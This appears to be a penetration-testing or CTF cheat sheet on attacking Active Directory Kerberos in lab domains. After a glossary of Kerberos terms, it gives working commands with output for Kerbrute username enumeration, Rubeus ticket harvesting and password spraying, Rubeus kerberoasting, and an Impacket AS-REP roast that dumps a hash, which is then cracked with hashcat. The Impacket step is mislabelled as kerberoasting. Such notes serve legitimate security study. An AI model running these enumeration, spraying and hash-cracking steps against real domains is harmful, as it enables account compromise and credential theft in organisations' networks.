# Active Directory

## Kerberos

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

Common Terminology -  

Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

### Enumeration w Kerbrute 

You need to add the DNS domain name with the machine IP to /etc/hosts `10.10.253.78  CONTROLLER.local`

1. Link: (Kerbrute GitHub)[https://github.com/ropnop/kerbrute/releases]
2. rename kerbrute_linux_amd64 to kerbrute
3. make it executable `chmod +x kerbrute`

### Enumerate Users w Kerbrute

1. You need a wordlist for Users -> (User.txt)[https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt]
2. 
```console
$ ./kerbrute userenum --dc 10.10.227.157 -d spookysec.local userlist.txt

Version: v1.0.3 (9dad6e1) - 03/12/22 - Ronnie Flathers @ropnop

2022/03/12 12:12:10 >  Using KDC(s):
2022/03/12 12:12:10 >   10.10.227.157:88

2022/03/12 12:12:11 >  [+] VALID USERNAME:       james@spookysec.local
2022/03/12 12:12:12 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2022/03/12 12:12:13 >  [+] VALID USERNAME:       James@spookysec.local
2022/03/12 12:12:13 >  [+] VALID USERNAME:       robin@spookysec.local
2022/03/12 12:12:18 >  [+] VALID USERNAME:       darkstar@spookysec.local
2022/03/12 12:12:20 >  [+] VALID USERNAME:       administrator@spookysec.local
2022/03/12 12:12:26 >  [+] VALID USERNAME:       backup@spookysec.local
2022/03/12 12:12:28 >  [+] VALID USERNAME:       paradox@spookysec.local
2022/03/12 12:12:45 >  [+] VALID USERNAME:       JAMES@spookysec.local
2022/03/12 12:12:51 >  [+] VALID USERNAME:       Robin@spookysec.local
2022/03/12 12:13:25 >  [+] VALID USERNAME:       Administrator@spookysec.local
2022/03/12 12:14:36 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2022/03/12 12:14:59 >  [+] VALID USERNAME:       Paradox@spookysec.local
2022/03/12 12:16:09 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2022/03/12 12:16:32 >  [+] VALID USERNAME:       ori@spookysec.local
2022/03/12 12:17:16 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2022/03/12 12:19:04 >  Done! Tested 73317 usernames (16 valid) in 413.056 seconds

```

### Harvesting/ Bruteforce Tickets w Rubeus

**Harvesting:**
You have to run it on attacker machine!
Link: (Rubeus GitHub)[https://github.com/GhostPack/Rubeus]

```console
$ Rubeus.exe harvest /interval:30

 - This command tells Rubeus to harvest for TGTs every 30 seconds
```
**Bruteforce**
Add the domain controller to windows hosts file `echo 10.10.253.78 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

```console
$ Rubeus.exe brute /password:Password1 /noticket

- This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
```

### Kerberoasting w Rubeus & Impacket

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.

**Method1: Rubeus**
```console
$ Rubeus.exe kerberoast 

- This will dump the Kerberos hash of any kerberoastable users

```

Copy the hash to your machine and crack it with hashcat

```console
$ hashcat -m 13100 -a 0 hash.txt wordlist.txt
```

**Method2: Impacket**

```console
$ cd /usr/share/doc/python3-impacket/examples/

$ ./GetNPUsers.py -no-pass -dc-ip 10.10.227.157 spookysec.local/svc-admin                                                                
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a9edf52350a4fa9634c1b0b8e88f180a$c4a770ce5ed7bfd6a853d0b16e279ad198530c0961bc03ebdb06cb22d65bef73422d803022e76893f27a2002130ceb7ad27ddbef1d13e878e8d41c40cdd4a3535af63f9c2de2a906873a89f3b73283d2df3d58736540ea611af315beb84c9ec36b3120e03e67c96b993c47467cfb727deb94778558a6b5b937c8f64b063114edbf146607828f969198eb3cbf88fa2b0a761ae2e6e12b5a579ec8a13b7543fd8c6b06eb1ed8e72d51c1e3d65f1aafd635e81dd0660aa09043918f7382eadb1725516872a8c4bdcdb6279a501efdb84cb37176ea95d23783f9a481e0c028581186ce6d7a96aac32ab8152a7317c1d278935ebc

$ hashcat -m 18200 -a 0 hash.txt passwordlist.txt
```